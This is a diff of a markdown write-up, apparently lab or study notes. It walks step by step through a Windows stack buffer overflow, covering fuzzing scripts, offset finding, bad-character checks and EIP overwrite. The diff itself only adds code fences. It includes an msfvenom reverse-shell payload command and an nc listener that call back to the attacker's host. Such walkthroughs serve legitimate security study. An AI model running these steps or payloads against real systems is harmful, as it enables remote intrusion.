@@ -90,7 +90,7 @@ The process needs to be running on the target machine **Admin**. We need to run 
 		
 	Step2: Fuzzing:
 		To find the exact bytes where it was breaking
-
+	```
 		#!/usr/bin/python3
 		import sys, socket
 		from time import sleep
@@ -109,13 +109,13 @@ The process needs to be running on the target machine **Admin**. We need to run 
    			except:
         		print("Fuzzing crashed vulnerable server at %s bytes" % str(len(buff)))
         		sys.exit()
-
+	```
 	Step3: finding offset:
 		
 		/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l  10500(output from last step, when server crashed)
 
 		We are able to find the ESP has been overloaded with the values that we have sent and Take the EIP value from the immunity debugger after it was crashed. The output from below will give exact bytes that are required to overwrite.
-	
+	```
 	#!/usr/bin/python3
 	import sys, socket
 
@@ -130,12 +130,12 @@ The process needs to be running on the target machine **Admin**. We need to run 
 	except:
 	    print("Error: Unable to establish connection with Server")
 	    sys.exit()
-
+```
 	
 		/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10500 -q 396F4338
 
 	Step4: Confirming the Overwrite:
-
+	```
 		#!/usr/bin/python3
 		import sys, socket
 		
@@ -150,11 +150,11 @@ The process needs to be running on the target machine **Admin**. We need to run 
 		except:
 		    print("Error: Unable to establish connection with Server")
 		    sys.exit()
-
+	```
 	
 	Step 5: Badchars checks
-
-		#!/usr/bin/python3
+```
+	#!/usr/bin/python3
 	import sys, socket
 	
 	badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
@@ -177,7 +177,7 @@ The process needs to be running on the target machine **Admin**. We need to run 
 	except:
 	    print("Error: Unable to establish connection with Server")
 	    sys.exit()
-
+```
 ->In Immunity Debugger, click on the ESP register value in the top-right window. Right-click on the selected ESP register value and click the Follow in Dump option.In the left-corner window, you can observe that there are no badchars that cause problems in the shellcode, as shown in the screenshot.
 
 	Step 6: Finding the right module
@@ -202,7 +202,7 @@ The process needs to be running on the target machine **Admin**. We need to run 
 
 
 	Step 8: Find If we can able to overwrite the EIP with return address and control the EIP register
-
+	```
 		#!/usr/bin/python3
 		import sys, socket
 		
@@ -217,7 +217,7 @@ The process needs to be running on the target machine **Admin**. We need to run 
 		except:
 		    print("Error: Unable to establish connection with Server")
 		    sys.exit()
-
+```
 	Step 9: Exploiting bufferover
 	
 		msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> EXITFUNC=thread -b "\x00\x0a\x0d" -f c -a x86
@@ -226,7 +226,7 @@ The process needs to be running on the target machine **Admin**. We need to run 
 			nc -lvnp 4444
 
 		BufferOverflow exploit:
-		
+		```
 			#!/usr/bin/python3
 			import sys, socket
 			
@@ -268,7 +268,7 @@ The process needs to be running on the target machine **Admin**. We need to run 
 			except:
 			    print("Error: Unable to establish connection with Server")
 			    sys.exit()
-
+		```
 
 
 ## Privilege Escalation
